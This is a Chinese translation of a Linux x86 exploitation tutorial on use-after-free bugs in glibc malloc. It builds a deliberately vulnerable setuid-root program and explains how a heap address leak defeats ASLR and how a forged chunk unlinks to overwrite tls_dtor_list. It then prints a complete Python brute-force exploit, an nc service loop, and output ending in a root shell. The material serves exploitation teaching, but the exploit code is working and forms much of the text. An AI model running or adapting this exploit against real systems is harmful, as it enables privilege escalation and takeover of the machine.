CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。  
转载本文请务必注明，文章出处：《[Linux(X86)漏洞利用系列-Use-after-free](http://www.csyssec.org/20170104/useafterfree))》与作者信息：CSysSec出品  


阅读基础:  
栈内off-by-one漏洞利用  
深入理解glibc malloc  
VM Setup: Fedora 20(x86)  

## 0X01 什么是use-after-free

当一个堆内存指针已经被释放，继续使用这个指针时，就称为use-after-free bug。这种bug能导致任意代码执行。  

漏洞代码:  

``` c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#define BUFSIZE1 1020
#define BUFSIZE2 ((BUFSIZE1/2) - 4)
int main(int argc, char **argv) {
 char* name = malloc(12); /* [1] */
 char* details = malloc(12); /* [2] */
 strncpy(name, argv[1], 12-1); /* [3] */
 free(details); /* [4] */
 free(name);  /* [5] */
 printf("Welcome %s\n",name); /* [6] */
 fflush(stdout);
 char* tmp = (char *) malloc(12); /* [7] */
 char* p1 = (char *) malloc(BUFSIZE1); /* [8] */
 char* p2 = (char *) malloc(BUFSIZE1); /* [9] */
 free(p2); /* [10] */
 char* p2_1 = (char *) malloc(BUFSIZE2); /* [11] */
 char* p2_2 = (char *) malloc(BUFSIZE2); /* [12] */
 printf("Enter your region\n");
 fflush(stdout);
 read(0,p2,BUFSIZE1-1); /* [13] */
 printf("Region:%s\n",p2); 
 free(p1); /* [14] */
}
```
编译命令:   

``` bash
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```
注意: 不像[前文](http://www.csyssec.org/20170104/heap-offbyone/)，这里打开了ASLR. 现在让我们开始利用UaF bug吧，由于已经打开了ASLR，我们用信息泄露和暴力破解技术来绕过它。  

上述漏洞代码含有两个UaF bug，分别在第[6]和[13]行。它们相对应的堆内存分别在第[5]和第[10]行被释放，但它们的指针在释放后仍然再次被使用 （第[6]和[13]行)！第[6]行的UaF导致信息泄露，而第[13]行的UaF导致任意代码执行。  

## 0X02 什么是信息泄露？攻击者如何利用？

在漏洞代码中(第[6]行)，信息是通过堆地址被泄露的。泄露的堆地址可以帮助攻击者很容易的算出已经被随机化的堆基地址，从而击败ASLR!  

为了理解堆地址是如何被泄露的，我们先来理解一下漏洞代码的上半部分。  

* 第[1]行分配了16字节的堆内存给’name’
* 第[2]行分配了16字节的堆内存给’details’
* 第[3]行将程序的argv[1]参数拷贝到’name’堆内存区域
* 第[4]和[5]行回收’name’和’details’堆内存给glibc malloc。
* 第[6]行的printf 在’name’指针被释放后继续使用，导致泄露堆地址。

从[前文](http://www.csyssec.org/20170104/glibcmalloc/) 我们知道，对应于’name’和’details’指针的chunk属于fast chunk。当这些fast chun被释放时，会被存储在fast bins的0索引处(index zero)。我们也知道每个fast bin含有空闲chunks的单链表。因此在我们的例子中，fast bin的 [0索引中](https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3887)的单链表形式如下所示：  

`main_arena.fastbinsY[0] ---> 'name_chunk_address' ---> 'details_chunk_address' ---> NULL`  
由于这种单链表形式，’name’的前四个字节含有’details_chunk’的地址。因此，当’name’被输出时，‘details_chunk’的地址先被输出。从堆栈布局，我们知道’details_chunk’ 位于堆基地址的偏移0x10处。因此，从获取被泄露的地址中减去0x10，就可以得到堆的基地址了。  

### 如何做到任意代码执行
现在已经获取随机化的堆基地址，理解漏洞代码的下半部分，让我们来看看是怎么做到任意代码执行的。  

* 第[7]行分配了16字节的堆内存给’tmp’
* 第[8]行分配了1024字节的堆内存给’p1’
* 第[9]行分配了1024字节的堆内存给’p2’
* 第[10]行回收了’p2’的1024字节堆内存给glibc malloc
* 第[11]行分配了512字节的堆内存给’p2_1’
* 第[12]行分配了512字节的堆内存给’p2_2’
* 第[13]行的read在’p2’被释放后继续使用它
* 第[14]行回收了’p1’的1024字节堆内存给glibc malloc，当程序退出时，导致任意代码执行。

通过阅读[前文](http://www.csyssec.org/20170104/glibcmalloc/)，我们知道当’p2’被回收给glibc maloc时候，会被[合并](https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L4017)到top chunk。 之后，当为’p2_1’请求内存时，会从top chunk中[分配](https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3755) -‘p2’和’p2_1’含有相同的堆地址。当为’p2_2’请求内存时，会从top chunk中- ‘p2_2’距’p2’有512字节。当’p2’指针释放后被使用(第[13]行)，攻击者控制的数据(最多1019字节)被拷贝到’pc_1’中，而’p2_1’只有512字节，剩下的被攻击者控制的字节会覆盖下一个chunk’p2_2’，这样一来就允许攻击者覆盖下一个chunk的头部size域!  

堆布局：  
![](../pictures/useafterfree.png)  


在[这里](http://www.csyssec.org/20170104/heap-offbyone/) 可以看出，如果攻击者成功覆盖下一个chunk的size域，就可以欺骗glibc malloc来unlink chunk ‘p2_1’了，尽管这时chunk已经处于分配状态。在[同一篇文](http://www.csyssec.org/20170104/heap-offbyone/) 中，我们也知道只要攻击者能小心的构造一个假的chunk头部信息，unlink一个已经处于分配状态的大chunk会导致任意代码执行!! 攻击者按一下方式构造假的chunk头部信息：  

* fd必须指回被释放的chunk地址。从堆布局中可以发现，’p2_1’位于偏移0x410处。 因此，fd=heap_base_address(可以从信息泄露bug中获取) + 0x410.
* bk也要指回被释放的chunk地址。从堆布局中可以发现，’p2_1’位于偏移0x410处。 因此，fd=heap_base_address(可以从信息泄露bug中获取) + 0x410.
* fd_nextsize必须指向tls_dtor_list - 0x14。 ‘tls_dtor_list’属于glibc的私有匿名映射段中，它已经被随机化。因此，可以利用下面的漏洞利用代码中的暴力破解技术绕过随机化。
* bk_nextsize必须指向含有dtor_list元素的堆地址！ 在构建假的chunk 头之后，’system’ dtor_list被攻击者注入，这时，’setuid’ dtor_list被攻击者注入来替代’p2_1’的堆内存区域。从堆布局中，我们可以知道’system’ 和’setuid’ dtor_list分别位于0x428和0x618处。

得到所有这些信息之后，我们就可以写个漏洞利用程序攻击二进制文件’vuln’了。  

漏洞利用代码：  

``` python
#exp.py
#!/usr/bin/env python
import struct
import sys
import telnetlib
import time
ip = '127.0.0.1'
port = 1234
def conv(num): return struct.pack("<I", num)
def send(data):
 global con
 con.write(data)
 return con.read_until('\n')
print "** Bruteforcing libc base address**"
libc_base_addr = 0xb756a000
fd_nextsize = (libc_base_addr - 0x1000) + 0x6c0
system = libc_base_addr + 0x3e6e0
system_arg = 0x80482ae
size = 0x200
setuid = libc_base_addr + 0xb9e30
setuid_arg = 0x0
while True:
 time.sleep(4)
 con = telnetlib.Telnet(ip, port)
 laddress = con.read_until('\n')
 laddress = laddress[8:12]
 heap_addr_tup = struct.unpack("<I", laddress)
 heap_addr = heap_addr_tup[0]
 print "** Leaked heap addresses : [0x%x] **" %(heap_addr)
 heap_base_addr = heap_addr - 0x10
 fd = heap_base_addr + 0x410
 bk = fd
 bk_nextsize = heap_base_addr + 0x618
 mp = heap_base_addr + 0x18
 nxt = heap_base_addr + 0x428
 print "** Constructing fake chunk to overwrite tls_dtor_list**"
 fake_chunk = conv(fd)
 fake_chunk += conv(bk)
 fake_chunk += conv(fd_nextsize)
 fake_chunk += conv(bk_nextsize)
 fake_chunk += conv(system)
 fake_chunk += conv(system_arg)
 fake_chunk += "A" * 484
 fake_chunk += conv(size)
 fake_chunk += conv(setuid)
 fake_chunk += conv(setuid_arg)
 fake_chunk += conv(mp)
 fake_chunk += conv(nxt)
 print "** Successful tls_dtor_list overwrite gives us shell!!**"
 send(fake_chunk)
 try: 
  con.interact()
 except: 
  exit(0)
```
使用暴力破解技术，我们需要尝试许多次来绕过随机化直至成功。我们可以让漏洞程序’vuln’作为网络服务器来运行，然后使用shell脚本保证当系统奔溃时能自动重启。  
``` sh
#vuln.sh
#!/bin/sh
nc_process_id=$(pidof nc)
while :
do
 if [[ -z $nc_process_id ]]; then
 echo "(Re)starting nc..."
 nc -l -p 1234 -c "./vuln sploitfun"
 else
 echo "nc is running..."
 fi
done
```
执行上述漏洞利用代码可以得到root shell! 太棒了!  

``` bash
Shell-1$./vuln.sh
Shell-2$python exp.py
...
** Leaked heap addresses : [0x889d010] **
** Constructing fake chunk to overwrite tls_dtor_list**
** Successfull tls_dtor_list overwrite gives us shell!!**
*** Connection closed by remote host ***
** Leaked heap addresses : [0x895d010] **
** Constructing fake chunk to overwrite tls_dtor_list**
** Successfull tls_dtor_list overwrite gives us shell!!**
*** Connection closed by remote host ***
id
uid=0(root) gid=1000(bala) groups=0(root),10(wheel),1000(bala) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
exit
** Leaked heap addresses : [0x890c010] **
** Constructing fake chunk to overwrite tls_dtor_list**
** Successfull tls_dtor_list overwrite gives us shell!!**
*** Connection closed by remote host ***
...
$
```

## 参考

1. [Revisiting Defcon CTF Shitsco Use-After-Free Vulnerability – Remote Code Execution](http://v0ids3curity.blogspot.in/2015/02/revisiting-defcon-ctf-shitsco-use-after.html)